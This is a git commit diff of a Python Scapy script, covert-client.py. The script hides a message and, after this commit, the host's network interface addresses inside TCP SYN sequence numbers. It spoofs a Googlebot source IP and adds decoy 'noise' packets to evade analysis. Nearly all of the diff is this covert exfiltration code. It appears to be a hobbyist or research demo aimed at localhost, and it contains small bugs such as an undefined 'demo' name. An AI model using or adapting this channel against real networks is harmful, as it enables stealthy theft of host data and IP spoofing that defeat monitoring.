6ae131a44312e71b045767392cc1ded22a66e0a6
clayball <cwells73@gmail.com>
2016-10-05 18:13:39 -0400

    adding ability to send network interface data, adding mode=demo.

--- covert-client.py
+++ covert-client.py
@@ -10,25 +10,43 @@
 
 # TODO:
 # - add try, except where appropriate
+# - add mode [demo, live]
+#   demo mode will send packets immediately
+#   live mode will send 1 packet per second 3 times, once a minute (adjustable)
+
+
+# =======
+# Imports
+# =======
 
 from scapy.all import *
 import os
 import sys
 import random
+import netifaces
 
 
+# ================
 # Global variables
+# ================
+
+# Set the mode
+mode = demo
+# mode = live
+
 thishost = os.uname()[1]
 multiplier = 16777216        # the server will be performing the division
 message = 'hello from ' + thishost
-seq_array = []
+seq_array = []  # clear before each use
 destination = '127.0.0.1'
-# spoof our source
-source = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
+# Spoof our source
+spoof = '66.249.66.1'  # Spoof crawl-66-249-66-1.googlebot.com
+# Get our real ip. This is especially useful in NAT'd environments.
+interfaces = netifaces.interfaces()
 
-
-##############################################################################
+# =========
 # Functions
+# =========
 
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
@@ -44,7 +62,7 @@ def convert_message():
 		seq_array.append(seq)
 		print '%s=%d, seq=%d' % (char, c, seq)
 
-def add_n0ise():
+def add_n0ise(i):
 	print '[*] adding n0ise..'
 	y = seq_array[i]
 	# Add some randomness for schlitz n giggles
@@ -55,31 +73,55 @@ def add_n0ise():
 	pkt.ttl = 128
 	send(pkt)
 
+def send_packet():
+	i = 0
+	k = 8192  # window size
+	for s in seq_array:
+		add_n0ise(i)
+		pkt.window = k
+		pkt.ttl = 64
+		pkt.seq = seq_array[i]
+		send(pkt)
+		i += 1
 
-##############################################################################
+
+# ============
 # Main program
+# ============
 
+# Convert our original message. Later we'll update our message and send
+# network interface data.
 convert_message()
-
-# Our seq_array has been built. Time to craft our packet and iterate over our
-# message.
 
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
 # that's complex enough to at least frustrate our adversaries.
 msglen = len(seq_array)
 
-pkt = IP(src=source, dst=destination)/TCP(dport=80, flags='S')
+pkt = IP(src=spoof, dst=destination)/TCP(dport=80, flags='S')
 
-# For now we'll send the message, without noise.
-i = 0
-k = 8192 # window size
-for s in seq_array:
-	add_n0ise()
-	pkt.window = k
-	pkt.ttl = 64
-	pkt.seq = seq_array[i]
-	send(pkt)
-	i += 1
+send_packet()
+
+seq_array = []  # clear before each use
+
+print '[*] sent: %s' % message
+print '[*] Getting ready to send network interface details'
+print '[*] interfaces: %s' % interfaces
+# Interesting in sending found en*, eth*, and wlp* interface data
+for face in interfaces:
+	addrs = netifaces.ifaddresses(face)
+	# Get the MAC address
+	facemac = addrs[netifaces.AF_LINK]
+	try:
+		print face, netifaces.ifaddresses(face)[2], facemac
+		# Try to display en*
+		if 'en' in face or 'eth' in face or 'wlp' in face:
+			print '[*] found: %s' % face
+			message = str(netifaces.ifaddresses(face)[2])
+			convert_message()
+			send_packet()
+	except:
+		# skip, do nothing
+		print "[-] interface does not contain AF_INET family."
 
 
